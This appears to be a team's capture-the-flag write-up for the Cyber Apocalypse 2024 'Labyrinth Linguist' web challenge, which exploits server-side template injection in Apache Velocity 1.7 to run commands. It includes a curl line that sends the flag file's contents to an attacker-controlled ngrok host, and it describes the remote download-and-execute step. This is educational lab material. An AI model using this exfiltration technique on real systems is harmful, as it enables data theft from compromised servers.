---
layout: load_md
title: The White Circle | Cyber Apocalypse 2024 | Labyrinth Linguist Writeup
desc: Check out our writeup for Labyrinth Linguist for Cyber Apocalypse 2024 capture the flag competition.
image: images/twc_og_banner.jpg
ctf: Cyber Apocalypse 2024
parent: cyber_apocalypse_2024
category: web
challenge: Labyrinth Linguist
tags: "web, twh, ssti"
date: 2024-03-16T00:00:00+00:00
last_modified_at: 2024-03-16T00:00:00+00:00
---


> Solved by : thewhiteh4t


- In this challenge we have a translation service
- Upon inspecting source files, we noticed few things : 
    - flag file is partially randomized in `entrypoint.sh`

```
mv /flag.txt /flag$(cat /dev/urandom | tr -cd "a-f0-9" | head -c 10).txt
```

- In `pom.xml` we can see the dependencies and their version information :

```xml
<parent>
  <groupId>org.springframework.boot</groupId>
  <artifactId>spring-boot-starter-parent</artifactId>
  <version>1.5.10.RELEASE</version>
</parent>

<dependencies>
  <dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-web</artifactId>
  </dependency>
  <dependency>
    <groupId>org.apache.velocity</groupId>
    <artifactId>velocity</artifactId>
    <version>1.7</version>
  </dependency>
  <dependency>
    <groupId>org.apache.velocity</groupId>
    <artifactId>velocity</artifactId>
    <version>1.7</version>
  </dependency>
</dependencies>
```

- Velocity v1.7 is vulnerable to SSTI attack
- References :
```
https://antgarsil.github.io/posts/velocity/
https://iwconnect.com/apache-velocity-server-side-template-injection/
```
- Based on the PoC above we ran the test case

```
#set ($run=1 + 1) $run
```

![](https://i.imgur.com/AltGQxG.png)

- RCE was blind because we had no output of the commands so we used `ngrok` for getting a callback to confirm if the payload was working
- Then we tried reverse shells but none of them worked for some reason so we thought to simplify we can make it download a file
- And since the command output was not visible we used web requests to exfiltrate the flag by setting custom user agent in curl command

```
> cat pwn

curl "https://f084-116-74-26-67.ngrok-free.app/special" -H "User-Agent: $(cat /flag*)"
```

![](https://i.imgur.com/8itLO2W.png)

- After sending the file we send a second request to run it using : `sh pwn`


![](https://i.imgur.com/sWeNay4.png)



- Web logs in ngrok dashboard :


![](https://i.imgur.com/o1yA2db.png)

